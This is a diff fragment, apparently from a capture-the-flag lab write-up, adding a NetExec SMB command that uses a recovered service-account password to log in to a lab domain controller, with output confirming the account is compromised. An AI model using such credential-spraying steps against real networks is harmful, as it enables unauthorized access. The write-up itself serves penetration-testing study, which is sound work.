@@ -475,5 +475,10 @@ sharesvc:#1Service
 ```
 
 ```python
-
+nxc smb lus2dc.lustrous2.vl -u sharesvc -p '#1Service' -k                                  
+SMB         lus2dc.lustrous2.vl 445    lus2dc           [*]  x64 (name:lus2dc) (domain:lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\sharesvc:#1Service
 ```
+
+This user is compromised
+
